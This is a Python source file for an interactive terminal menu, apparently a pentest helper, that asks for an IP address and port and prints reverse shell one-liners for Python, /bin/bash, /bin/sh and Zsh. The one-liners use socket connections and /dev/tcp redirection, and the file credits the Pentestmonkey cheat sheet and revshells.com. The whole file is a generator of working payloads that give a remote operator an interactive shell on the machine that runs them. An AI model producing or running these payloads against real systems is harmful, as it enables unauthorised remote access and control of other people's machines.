#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import subprocess as su
from termcolor import colored

class Reverse:

    @staticmethod
    def clear():
        su.run("clear", shell=True) #Clear Terminal

    @staticmethod
    def press_continue():
        try:
            enter = input(colored("Press Enter For Continue...", "light_blue", attrs=['bold']))
            return False
        except (KeyboardInterrupt, EOFError):
            return False

    @staticmethod
    def reverse():
        
        while True: #Start Loop
            Reverse.clear() #Clear Screen

            # Menu
            print(colored(rf"""
 (                      (    (          (        )       (     (    
 )\ )                   )\ ) )\ )       )\ )  ( /(       )\ )  )\ ) 
(()/( (    (   (   (   (()/((()/( (    (()/(  )\()) (   (()/( (()/( 
 /(_)))\   )\  )\  )\   /(_))/(_)))\    /(_))((_)\  )\   /(_)) /(_))
(_)) ((_) ((_)((_)((_) (_)) (_)) ((_)  (_))   _((_)((_) (_))  (_))  
| _ \| __|\ \ / / | __|| _ \/ __|| __| / __| | || || __|| |   | |   
|   /| _|  \ V /  | _| |   /\__ \| _|  \__ \ | __ || _| | |__ | |__ 
|_|_\|___|  \_/   |___||_|_\|___/|___| |___/ |_||_||___||____||____|
--------------------------------------------------------------------
{colored("[01] - Python", "green", attrs=['bold'])}
{colored("[02] - /bin/bash", "green", attrs=['bold'])}
{colored("[03] - /bin/sh", "green", attrs=['bold'])}
{colored("[04] - Zsh", "green", attrs=['bold'])}
{colored("[00] - Back to Main Menu", "green", attrs=['bold'])}                     
""", "red", attrs=['bold']))
            
            try:
                choice = int(input(colored("Enter : ", "light_blue", attrs=['bold']))) #Get Input
            except (KeyboardInterrupt, EOFError):
                break
            except ValueError:
                Reverse.clear()
                continue
            
            #Python
            if choice == 1:
                
                '''
                
                This Partion Using Pentestmonkey Python Reverse Shell Code. If you want more information visit : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
                
                '''
                
                Reverse.clear()
                try:
                    ip = input(colored("Enter IP Address : ", "light_blue", attrs=['bold'])) # IP Address
                    port = input(colored("Enter Port : ", "light_blue", attrs=['bold'])) # Port
                except (KeyboardInterrupt,EOFError):
                    break
                print(colored(f"""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
""", "green", attrs=['bold'])) # Reverse Shell Code
                
                try:
                    enter = input(colored("Press Enter For Continue...", "light_blue", attrs=['bold'])) # Press Enter For Continue
                    continue
                except (KeyboardInterrupt, EOFError):
                    break
            #/bin/bash
            elif choice == 2:
                
                '''
                
                This Partion Using https://www.revshells.com/ Site. If you want more information visit this site...

                '''
                
                Reverse.clear()
                
                # Get IP address and Port
                try:
                    ip = input(colored("Enter Ip Address : ", "light_blue", attrs=['bold']))
                    port = input(colored("Enter Port : ", "light_blue", attrs=['bold']))
                except (KeyboardInterrupt, EOFError):
                    break
                
                print(colored(f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1", "green", attrs=['bold'])) # /bin/bash reverse shell code
                
                # Press Continue
                try:
                    enter = input(colored("Press Enter For Continue...", "light_blue", attrs=['bold']))
                    continue
                except (KeyboardInterrupt, EOFError):
                    break
            
            
            #/bin/sh
            elif choice == 3:
                Reverse.clear()

                '''
                
                This partion same the other partion. But in this partion just using /bin/sh
                
                '''
                
                # IP And Port
                try:
                    ip = input(colored("Enter IP Address : ", "light_blue", attrs=['bold']))
                    port = input(colored("Enter Port : ", "light_blue", attrs=['bold']))
                except (KeyboardInterrupt, EOFError):
                    break
                print(colored(f"/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1", "green", attrs=['bold'])) # /bin/sh reverse shell code

                # Press Continue
                try:
                    enter = input(colored("Press Enter For Continue...", "light_blue", attrs=['bold']))
                    continue
                except (KeyboardInterrupt, EOFError):
                    break
                
            #Zsh
            elif choice == 4:
                Reverse.clear()
                
                try:
                    ip = input(colored("Enter IP Address : ", "light_blue", attrs=['bold'])) # Get IP Address
                    port = input(colored("Enter Port : ", "light_blue", attrs=['bold'])) # Get Port
                except (KeyboardInterrupt, EOFError):
                    break
                print(colored(f"zsh -i >& /dev/tcp/{ip}/{port} 0>&1", "green", attrs=['bold'])) # /bin/sh reverse shell code

                # Press Continue
                try:
                    enter = input(colored("Press Enter For Continue...", "light_blue", attrs=['bold']))
                    continue
                except (KeyboardInterrupt, EOFError):
                    break

            elif choice == 0:
                break